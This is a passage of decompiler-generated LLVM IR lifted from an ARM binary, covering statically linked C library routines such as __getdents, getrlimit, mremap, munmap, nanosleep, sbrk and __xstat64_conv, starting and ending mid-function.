  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_16300 = add i32 %v4_162f4, %v0_162f0
  %v4_16300 = inttoptr i32 %v3_16300 to i32*
  store i32 %v1_162f8, i32* %v4_16300, align 4
  br label %dec_label_pc_16318

dec_label_pc_16308:                               ; preds = %entry
  store i32 %v0_162e0, i32* %r7.global-to-local, align 4
  %v2_16308 = icmp eq i32 %v0_162e0, 0
  br i1 %v2_16308, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16308
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16308, %bb
  call void @__pseudo_cond_branch(i1 %v2_16308, i32 ptrtoint (i32* @global_var_16758.593 to i32))
  br label %dec_label_pc_16318

dec_label_pc_16318:                               ; preds = %dec_label_pc_162ec, %.thread
  %v0_16318 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_16318

; uselistorder directives
  uselistorder i32 %v0_162e0, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 197, { 1, 0 }
  uselistorder label %dec_label_pc_16318, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_1632c = load i32, i32* @r5, align 4
  %v18_1632c = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16364, label %dec_label_pc_16348

dec_label_pc_16348:                               ; preds = %entry
  %v1_1634c = sub i32 0, %arg1
  %v3_16350 = load i16, i16* @global_var_23068.363, align 2
  %v4_16350 = sext i16 %v3_16350 to i32
  store i32 %v4_16350, i32* %r3.global-to-local, align 4
  %v0_16354 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_1635c = add i32 %v4_16350, %v0_16354
  %v4_1635c = inttoptr i32 %v3_1635c to i32*
  store i32 %v1_1634c, i32* %v4_1635c, align 4
  br label %dec_label_pc_163b8

dec_label_pc_16364:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_16364
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_1636c = add i32 %arg2, %arg1
  store i32 %v3_1636c, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16364, %bb
  %v1_163a84 = phi i32 [ %v18_1632c, %dec_label_pc_16364 ], [ %v3_1636c, %bb ]
  %v0_163a42 = phi i32 [ 141, %dec_label_pc_16364 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_163b8, label %dec_label_pc_163a4

dec_label_pc_16378:                               ; preds = %dec_label_pc_163a4
  %v1_163ac = inttoptr i32 %v1_163a4 to i8*
  %v1_16378 = add i32 %v0_16378, 8
  %v2_16378 = inttoptr i32 %v1_16378 to i16*
  %v3_16378 = load i16, i16* %v2_16378, align 2
  %v4_16378 = zext i16 %v3_16378 to i32
  %v2_1637c = add i32 %v4_16378, %v0_16378
  store i32 %v2_1637c, i32* @r3, align 4
  %v1_16380 = add i32 %v2_1637c, -1
  %v2_16380 = inttoptr i32 %v1_16380 to i8*
  %v3_16380 = load i8, i8* %v2_16380, align 1
  %v4_16380 = zext i8 %v3_16380 to i32
  store i32 %v4_16380, i32* @r4, align 4
  %v3_16384 = call i32 @strlen(i8* %v1_163ac)
  %v0_16388 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16388, i32* @r1, align 4
  %v1_1638c = add i32 %v3_16384, 1
  store i32 %v1_1638c, i32* @r2, align 4
  %v0_16390 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_16390, i32* @r0, align 4
  %v3_16394 = call i32 @memmove(i32 %v0_16390, i32 %v0_16388, i32 %v1_1638c)
  %v0_16398 = load i32, i32* %r7.global-to-local, align 4
  %v1_16398 = add i32 %v0_16398, 8
  %v2_16398 = inttoptr i32 %v1_16398 to i16*
  %v3_16398 = load i16, i16* %v2_16398, align 2
  %v4_16398 = zext i16 %v3_16398 to i32
  store i32 %v4_16398, i32* %r3.global-to-local, align 4
  %v0_1639c = load i32, i32* @r4, align 4
  %v1_1639c = trunc i32 %v0_1639c to i8
  %v3_1639c = add i32 %v0_16398, 10
  %v4_1639c = inttoptr i32 %v3_1639c to i8*
  store i8 %v1_1639c, i8* %v4_1639c, align 1
  %v0_163a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_163a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_163a0 = add i32 %v1_163a0, %v0_163a0
  store i32 %v2_163a0, i32* %r7.global-to-local, align 4
  %v1_163a8.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_163a4

dec_label_pc_163a4:                               ; preds = %.thread, %dec_label_pc_16378
  %v1_163a8 = phi i32 [ %v1_163a8.pre, %dec_label_pc_16378 ], [ %v1_163a84, %.thread ]
  %v0_16378 = phi i32 [ %v2_163a0, %dec_label_pc_16378 ], [ %v0_163a42, %.thread ]
  %v1_163a4 = add i32 %v0_16378, 10
  store i32 %v1_163a4, i32* %r6.global-to-local, align 4
  %v3_163a8 = icmp ult i32 %v0_16378, %v1_163a8
  %v1_163b0 = add i32 %v0_16378, 11
  store i32 %v1_163b0, i32* %r8.global-to-local, align 4
  br i1 %v3_163a8, label %dec_label_pc_16378, label %dec_label_pc_163b8

dec_label_pc_163b8:                               ; preds = %dec_label_pc_163a4, %.thread, %dec_label_pc_16348
  %v0_163b8 = load i32, i32* @r5, align 4
  store i32 %v6_1632c, i32* @r5, align 4
  store i32 %v18_1632c, i32* @sl, align 4
  ret i32 %v0_163b8

; uselistorder directives
  uselistorder i32 %v1_163a4, { 1, 0 }
  uselistorder i32 %v0_16378, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_1632c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 141, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_163a4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_163d0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_163dc = call i32 @getrlimit(i32 7, i32 %v2_163d0)
  %v1_163e0 = icmp slt i32 %v2_163dc, 0
  %v5_163e4 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_163e0, i32 256, i32 %v5_163e4
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_16408 = load i32, i32* @r0, align 4
  ret i32 %v1_16408
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_1641c = load i32, i32* @r0, align 4
  ret i32 %v1_1641c
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_16430 = load i32, i32* @r0, align 4
  ret i32 %v1_16430
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_16440 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 148) to i32*), align 4
  %v1_16444 = inttoptr i32 %v4_16440 to i32*
  %v2_16444 = load i32, i32* %v1_16444, align 4
  %v2_16448 = icmp eq i32 %v2_16444, 0
  br i1 %v2_16448, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_16450 = phi i32 [ %v2_16444, %entry ], [ 4096, %bb ]
  ret i32 %v1_16450

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16488, label %dec_label_pc_16470

dec_label_pc_16470:                               ; preds = %entry
  %v1_16474 = sub i32 0, %arg1
  %v3_16478 = load i16, i16* @global_var_23068.363, align 2
  %v4_16478 = sext i16 %v3_16478 to i32
  %v0_1647c = call i32 @__aeabi_read_tp()
  %v3_16480 = add i32 %v4_16478, %v0_1647c
  %v4_16480 = inttoptr i32 %v3_16480 to i32*
  store i32 %v1_16474, i32* %v4_16480, align 4
  br label %dec_label_pc_16488

dec_label_pc_16488:                               ; preds = %entry, %dec_label_pc_16470
  %v1_1648c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_16470 ]
  ret i32 %v1_1648c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16488, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16494 = load i32, i32* @r7, align 4
  store i32 %v3_16494, i32* %stack_var_-8, align 4
  %v0_164a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_164a0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_164a0, -4095
  br i1 %tmp, label %dec_label_pc_164c8, label %dec_label_pc_164b0

dec_label_pc_164b0:                               ; preds = %entry
  %v0_164b4 = call i32 @__aeabi_read_tp()
  %v3_164b8 = load i16, i16* @global_var_23068.363, align 2
  %v4_164b8 = sext i16 %v3_164b8 to i32
  store i32 %v4_164b8, i32* @r3, align 4
  %v0_164bc = load i32, i32* %r2.global-to-local, align 4
  %v1_164bc = sub i32 0, %v0_164bc
  store i32 %v1_164bc, i32* %r2.global-to-local, align 4
  %v3_164c0 = add i32 %v4_164b8, %v0_164b4
  %v4_164c0 = inttoptr i32 %v3_164c0 to i32*
  store i32 %v1_164bc, i32* %v4_164c0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_164c8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_164c8

dec_label_pc_164c8:                               ; preds = %entry, %dec_label_pc_164b0
  %v1_164cc = phi i32 [ %v0_164a0, %entry ], [ -1, %dec_label_pc_164b0 ]
  %v2_164c8 = phi i32 [ %v3_16494, %entry ], [ %v2_164c8.pre, %dec_label_pc_164b0 ]
  store i32 %v2_164c8, i32* @r7, align 4
  ret i32 %v1_164cc

; uselistorder directives
  uselistorder i32 %v0_164a0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_164c8, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_164e4 = load i32, i32* @r0, align 4
  ret i32 %v1_164e4
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_164e8 = load i32, i32* @r4, align 4
  store i32 %v3_164e8, i32* %stack_var_-12, align 4
  %v0_164f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_164f8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_164f8, -4095
  br i1 %tmp, label %dec_label_pc_16520, label %dec_label_pc_16508

dec_label_pc_16508:                               ; preds = %entry
  %v0_1650c = call i32 @__aeabi_read_tp()
  %v3_16510 = load i16, i16* @global_var_23068.363, align 2
  %v4_16510 = sext i16 %v3_16510 to i32
  %v0_16514 = load i32, i32* %r2.global-to-local, align 4
  %v1_16514 = sub i32 0, %v0_16514
  store i32 %v1_16514, i32* %r2.global-to-local, align 4
  %v3_16518 = add i32 %v4_16510, %v0_1650c
  %v4_16518 = inttoptr i32 %v3_16518 to i32*
  store i32 %v1_16514, i32* %v4_16518, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16520.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16520

dec_label_pc_16520:                               ; preds = %entry, %dec_label_pc_16508
  %v1_16524 = phi i32 [ %v0_164f8, %entry ], [ -1, %dec_label_pc_16508 ]
  %v2_16520 = phi i32 [ %v3_164e8, %entry ], [ %v2_16520.pre, %dec_label_pc_16508 ]
  store i32 %v2_16520, i32* @r4, align 4
  ret i32 %v1_16524

; uselistorder directives
  uselistorder i32 %v0_164f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16520, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1652c = load i32, i32* @r7, align 4
  store i32 %v3_1652c, i32* %stack_var_-8, align 4
  %v0_16538 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16538, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16538, -4095
  br i1 %tmp, label %dec_label_pc_16560, label %dec_label_pc_16548

dec_label_pc_16548:                               ; preds = %entry
  %v0_1654c = call i32 @__aeabi_read_tp()
  %v3_16550 = load i16, i16* @global_var_23068.363, align 2
  %v4_16550 = sext i16 %v3_16550 to i32
  %v0_16554 = load i32, i32* %r2.global-to-local, align 4
  %v1_16554 = sub i32 0, %v0_16554
  store i32 %v1_16554, i32* %r2.global-to-local, align 4
  %v3_16558 = add i32 %v4_16550, %v0_1654c
  %v4_16558 = inttoptr i32 %v3_16558 to i32*
  store i32 %v1_16554, i32* %v4_16558, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16560.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16560

dec_label_pc_16560:                               ; preds = %entry, %dec_label_pc_16548
  %v1_16564 = phi i32 [ %v0_16538, %entry ], [ -1, %dec_label_pc_16548 ]
  %v2_16560 = phi i32 [ %v3_1652c, %entry ], [ %v2_16560.pre, %dec_label_pc_16548 ]
  store i32 %v2_16560, i32* @r7, align 4
  ret i32 %v1_16564

; uselistorder directives
  uselistorder i32 %v0_16538, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16560, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1656c = load i32, i32* @r7, align 4
  store i32 %v3_1656c, i32* %stack_var_-8, align 4
  %v0_16578 = load i32, i32* @r0, align 4
  store i32 %v0_16578, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16578, -4095
  br i1 %tmp, label %dec_label_pc_165a0, label %dec_label_pc_16588

dec_label_pc_16588:                               ; preds = %entry
  %v0_1658c = call i32 @__aeabi_read_tp()
  %v3_16590 = load i16, i16* @global_var_23068.363, align 2
  %v4_16590 = sext i16 %v3_16590 to i32
  %v0_16594 = load i32, i32* %r2.global-to-local, align 4
  %v1_16594 = sub i32 0, %v0_16594
  store i32 %v1_16594, i32* %r2.global-to-local, align 4
  %v3_16598 = add i32 %v4_16590, %v0_1658c
  %v4_16598 = inttoptr i32 %v3_16598 to i32*
  store i32 %v1_16594, i32* %v4_16598, align 4
  %v2_165a0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_165a0

dec_label_pc_165a0:                               ; preds = %entry, %dec_label_pc_16588
  %v1_165a4 = phi i32 [ %v0_16578, %entry ], [ -1, %dec_label_pc_16588 ]
  %v2_165a0 = phi i32 [ %v3_1656c, %entry ], [ %v2_165a0.pre, %dec_label_pc_16588 ]
  store i32 %v2_165a0, i32* @r7, align 4
  ret i32 %v1_165a4

; uselistorder directives
  uselistorder i32 %v0_16578, { 1, 0, 2 }
  uselistorder label %dec_label_pc_165a0, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_165b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 12772) to i32*), align 4
  %v2_165bc = icmp eq i32 %v4_165b8, 0
  %v3_165c0 = load i32, i32* @r4, align 4
  %v9_165c0 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_165bc, label %dec_label_pc_165d0, label %entry.dec_label_pc_165d8_crit_edge

entry.dec_label_pc_165d8_crit_edge:               ; preds = %entry
  br label %dec_label_pc_165d8

dec_label_pc_165d0:                               ; preds = %entry
  store i32 %v3_165c0, i32* @r4, align 4
  store i32 %v9_165c0, i32* @r6, align 4
  %v0_165d4 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_165d8

dec_label_pc_165d8:                               ; preds = %entry.dec_label_pc_165d8_crit_edge, %dec_label_pc_165d0
  %v0_165d8 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_165d8, i32* @r5, align 4
  %v0_165e4 = load i32, i32* @r4, align 4
  store i32 %v0_165e4, i32* @r0, align 4
  %v0_165e8 = call i32 @__syscall_nanosleep()
  store i32 %v0_165e8, i32* @r4, align 4
  %v0_165f0 = load i32, i32* @r5, align 4
  %v1_165f4 = call i32 @__libc_disable_asynccancel(i32 %v0_165f0)
  %v0_165f8 = load i32, i32* @r4, align 4
  ret i32 %v0_165f8

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 2, 7, 12, 1, 6, 5, 4, 8, 11, 3, 10, 9, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 2, 7, 12, 1, 6, 5, 4, 8, 11, 3, 10, 9, 0 }
  uselistorder label %dec_label_pc_165d8, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1660c = load i32, i32* @r4, align 4
  store i32 %v3_1660c, i32* %stack_var_-16, align 4
  store i32 11572, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r4.global-to-local, align 4
  %v4_1661c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 11572) to i32*), align 4
  %v2_16620 = icmp eq i32 %v4_1661c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_16620, label %dec_label_pc_1662c, label %dec_label_pc_1663c

dec_label_pc_1662c:                               ; preds = %entry
  %v1_16630 = call i32 @__GI_brk(i32 0)
  %v1_16634 = icmp slt i32 %v1_16630, 0
  br i1 %v1_16634, label %dec_label_pc_16660, label %dec_label_pc_1663cthread-pre-split

dec_label_pc_1663cthread-pre-split:               ; preds = %dec_label_pc_1662c
  %v0_16640.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_1663c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1663c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1663c

dec_label_pc_1663c:                               ; preds = %dec_label_pc_1663cthread-pre-split, %entry
  %v1_1663c = phi i32 [ %v1_1663c.pre, %dec_label_pc_1663cthread-pre-split ], [ 11572, %entry ]
  %v0_1663c = phi i32 [ %v0_1663c.pre, %dec_label_pc_1663cthread-pre-split ], [ ptrtoint (i32* @global_var_23010.367 to i32), %entry ]
  %v1_16650 = phi i32 [ %v0_16640.pr, %dec_label_pc_1663cthread-pre-split ], [ %arg1, %entry ]
  %v2_1663c = add i32 %v0_1663c, %v1_1663c
  %v3_1663c = inttoptr i32 %v2_1663c to i32*
  %v4_1663c = load i32, i32* %v3_1663c, align 4
  %v2_16640 = icmp eq i32 %v1_16650, 0
  store i32 %v4_1663c, i32* %r4.global-to-local, align 4
  br i1 %v2_16640, label %dec_label_pc_16664, label %dec_label_pc_1664c

dec_label_pc_1664c:                               ; preds = %dec_label_pc_1663c
  %v2_16650 = add i32 %v4_1663c, %v1_16650
  %v1_16654 = call i32 @__GI_brk(i32 %v2_16650)
  %v1_16658 = icmp slt i32 %v1_16654, 0
  br i1 %v1_16658, label %dec_label_pc_16660, label %dec_label_pc_1664c.dec_label_pc_16664_crit_edge

dec_label_pc_1664c.dec_label_pc_16664_crit_edge:  ; preds = %dec_label_pc_1664c
  %v0_16664.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16664

dec_label_pc_16660:                               ; preds = %dec_label_pc_1664c, %dec_label_pc_1662c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16664

dec_label_pc_16664:                               ; preds = %dec_label_pc_1663c, %dec_label_pc_1664c.dec_label_pc_16664_crit_edge, %dec_label_pc_16660
  %v0_16664 = phi i32 [ %v0_16664.pre, %dec_label_pc_1664c.dec_label_pc_16664_crit_edge ], [ -1, %dec_label_pc_16660 ], [ %v4_1663c, %dec_label_pc_1663c ]
  %v2_16668 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16668, i32* @r4, align 4
  ret i32 %v0_16664

; uselistorder directives
  uselistorder i32 %v4_1663c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_16664, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_16688 = load i32, i32* @r0, align 4
  ret i32 %v1_16688
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1668c = load i32, i32* @r4, align 4
  store i32 %v3_1668c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_166a4 = inttoptr i32 %arg2 to i8*
  %v4_166a4 = call i32 @__GI_memset(i8* %v3_166a4, i32 0, i32 104)
  %v2_166a8 = load i32, i32* %arg1, align 4
  store i32 %v2_166a8, i32* %r3.global-to-local, align 4
  %v3_166a8 = add i32 %tmp, 4
  %v4_166a8 = inttoptr i32 %v3_166a8 to i32*
  %v5_166a8 = load i32, i32* %v4_166a8, align 4
  store i32 %v5_166a8, i32* %r4.global-to-local, align 4
  %v0_166ac = load i32, i32* %r5.global-to-local, align 4
  %v1_166ac = inttoptr i32 %v0_166ac to i32*
  store i32 %v2_166a8, i32* %v1_166ac, align 4
  %v3_166ac = add i32 %v0_166ac, 4
  %v4_166ac = inttoptr i32 %v3_166ac to i32*
  %v5_166ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_166ac, i32* %v4_166ac, align 4
  %v0_166b0 = load i32, i32* %r6.global-to-local, align 4
  %v1_166b0 = add i32 %v0_166b0, 12
  %v2_166b0 = inttoptr i32 %v1_166b0 to i32*
  %v3_166b0 = load i32, i32* %v2_166b0, align 4
  %v1_166b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_166b4 = add i32 %v1_166b4, 12
  %v3_166b4 = inttoptr i32 %v2_166b4 to i32*
  store i32 %v3_166b0, i32* %v3_166b4, align 4
  %v0_166b8 = load i32, i32* %r6.global-to-local, align 4
  %v1_166b8 = add i32 %v0_166b8, 96
  store i32 %v1_166b8, i32* %r3.global-to-local, align 4
  %v1_166bc = inttoptr i32 %v1_166b8 to i32*
  %v2_166bc = load i32, i32* %v1_166bc, align 4
  store i32 %v2_166bc, i32* %r3.global-to-local, align 4
  %v3_166bc = add i32 %v0_166b8, 100
  %v4_166bc = inttoptr i32 %v3_166bc to i32*
  %v5_166bc = load i32, i32* %v4_166bc, align 4
  store i32 %v5_166bc, i32* %r4.global-to-local, align 4
  %v1_166c0 = add i32 %v0_166b8, 56
  %v2_166c0 = inttoptr i32 %v1_166c0 to i32*
  %v3_166c0 = load i32, i32* %v2_166c0, align 4
  store i32 %v3_166c0, i32* %r2.global-to-local, align 4
  %v1_166c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_166c4 = add i32 %v1_166c4, 96
  %v3_166c4 = inttoptr i32 %v2_166c4 to i32*
  store i32 %v2_166bc, i32* %v3_166c4, align 4
  %v0_166c8 = load i32, i32* %r4.global-to-local, align 4
  %v1_166c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_166c8 = add i32 %v1_166c8, 100
  %v3_166c8 = inttoptr i32 %v2_166c8 to i32*
  store i32 %v0_166c8, i32* %v3_166c8, align 4
  %v0_166cc = load i32, i32* %r6.global-to-local, align 4
  %v1_166cc = add i32 %v0_166cc, 24
  store i32 %v1_166cc, i32* %ip.global-to-local, align 4
  %v1_166d0 = inttoptr i32 %v1_166cc to i32*
  %v2_166d0 = load i32, i32* %v1_166d0, align 4
  store i32 %v2_166d0, i32* %ip.global-to-local, align 4
  %v3_166d0 = add i32 %v0_166cc, 28
  %v4_166d0 = inttoptr i32 %v3_166d0 to i32*
  %v5_166d0 = load i32, i32* %v4_166d0, align 4
  store i32 %v5_166d0, i32* %lr.global-to-local, align 4
  %v0_166d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_166d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_166d4 = add i32 %v1_166d4, 56
  %v3_166d4 = inttoptr i32 %v2_166d4 to i32*
  store i32 %v0_166d4, i32* %v3_166d4, align 4
  %v0_166d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_166d8 = add i32 %v0_166d8, 72
  store i32 %v1_166d8, i32* %r3.global-to-local, align 4
  %v1_166dc = add i32 %v0_166d8, 32
  store i32 %v1_166dc, i32* %r7.global-to-local, align 4
  %v1_166e0 = inttoptr i32 %v1_166dc to i32*
  %v2_166e0 = load i32, i32* %v1_166e0, align 4
  store i32 %v2_166e0, i32* %r7.global-to-local, align 4
  %v3_166e0 = add i32 %v0_166d8, 36
  %v4_166e0 = inttoptr i32 %v3_166e0 to i32*
  %v5_166e0 = load i32, i32* %v4_166e0, align 4
  store i32 %v5_166e0, i32* %r8.global-to-local, align 4
  %v1_166e4 = inttoptr i32 %v1_166d8 to i32*
  %v2_166e4 = load i32, i32* %v1_166e4, align 4
  %v3_166e4 = add i32 %v0_166d8, 76
  %v4_166e4 = inttoptr i32 %v3_166e4 to i32*
  %v5_166e4 = load i32, i32* %v4_166e4, align 4
  store i32 %v5_166e4, i32* %r1.global-to-local, align 4
  %v0_166e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_166e8 = add i32 %v0_166e8, 72
  %v1_166ec = inttoptr i32 %v1_166e8 to i32*
  store i32 %v2_166e4, i32* %v1_166ec, align 4
  %v3_166ec = add i32 %v0_166e8, 76
  %v4_166ec = inttoptr i32 %v3_166ec to i32*
  %v5_166ec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_166ec, i32* %v4_166ec, align 4
  %v0_166f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_166f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_166f0 = add i32 %v1_166f0, 32
  %v3_166f0 = inttoptr i32 %v2_166f0 to i32*
  store i32 %v0_166f0, i32* %v3_166f0, align 4
  %v0_166f4 = load i32, i32* %r8.global-to-local, align 4
  %v1_166f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_166f4 = add i32 %v1_166f4, 36
  %v3_166f4 = inttoptr i32 %v2_166f4 to i32*
  store i32 %v0_166f4, i32* %v3_166f4, align 4
  %v0_166f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_166f8 = add i32 %v0_166f8, 80
  store i32 %v1_166f8, i32* %r3.global-to-local, align 4
  %v1_166fc = add i32 %v0_166f8, 48
  store i32 %v1_166fc, i32* %r7.global-to-local, align 4
  %v1_16700 = inttoptr i32 %v1_166fc to i32*
  %v2_16700 = load i32, i32* %v1_16700, align 4
  store i32 %v2_16700, i32* %r7.global-to-local, align 4
  %v3_16700 = add i32 %v0_166f8, 52
  %v4_16700 = inttoptr i32 %v3_16700 to i32*
  %v5_16700 = load i32, i32* %v4_16700, align 4
  store i32 %v5_16700, i32* %r8.global-to-local, align 4
  %v1_16704 = inttoptr i32 %v1_166f8 to i32*
  %v2_16704 = load i32, i32* %v1_16704, align 4
  %v3_16704 = add i32 %v0_166f8, 84
  %v4_16704 = inttoptr i32 %v3_16704 to i32*
  %v5_16704 = load i32, i32* %v4_16704, align 4
  store i32 %v5_16704, i32* %r1.global-to-local, align 4
  %v1_16708 = add i32 %v0_166f8, 16
  %v2_16708 = inttoptr i32 %v1_16708 to i32*
  %v3_16708 = load i32, i32* %v2_16708, align 4
  store i32 %v3_16708, i32* %r2.global-to-local, align 4
  %v0_1670c = load i32, i32* %r5.global-to-local, align 4
